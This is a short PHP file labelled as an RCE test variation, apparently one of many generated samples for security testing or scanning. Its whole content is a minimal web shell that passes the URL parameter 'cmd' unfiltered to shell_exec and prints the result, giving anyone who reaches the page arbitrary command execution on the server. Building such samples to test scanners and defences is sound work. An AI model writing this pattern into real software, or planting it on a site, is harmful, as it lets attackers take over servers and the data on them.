<?php
// RCE test variation #459
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>